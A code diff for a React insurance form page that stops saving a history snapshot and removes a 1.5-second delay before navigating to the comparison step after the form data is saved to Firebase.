@@ -10,7 +10,7 @@ import { StepIndicator } from "@/components/step-indicator"
 import { getOrCreateVisitorID, updateVisitorPage, checkIfBlocked } from "@/lib/visitor-tracking"
 import { useAutoSave } from "@/hooks/use-auto-save"
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
-import { addData, saveToHistory } from "@/lib/firebase"
+import { addData } from "@/lib/firebase"
 import { translations } from "@/lib/translations"
 
 export default function InsurancePage() {
@@ -86,11 +86,6 @@ export default function InsurancePage() {
       return
     }
     
-    setLoading(true)
-    
-    // Save current data to history before updating
-    await saveToHistory(visitorID, 2)
-    
     await addData({
       id: visitorID,
       insuranceCoverage,
@@ -104,11 +99,8 @@ export default function InsurancePage() {
       currentPage: "compar",
       insurCompletedAt: new Date().toISOString()
     }).then(() => {
-      // Wait 1.5 seconds before moving to next step
-      setTimeout(() => {
-        setLoading(false)
-        router.push('/compar')
-      }, 1500)
+      // Navigate immediately
+      router.push('/compar')
     })
   }
   
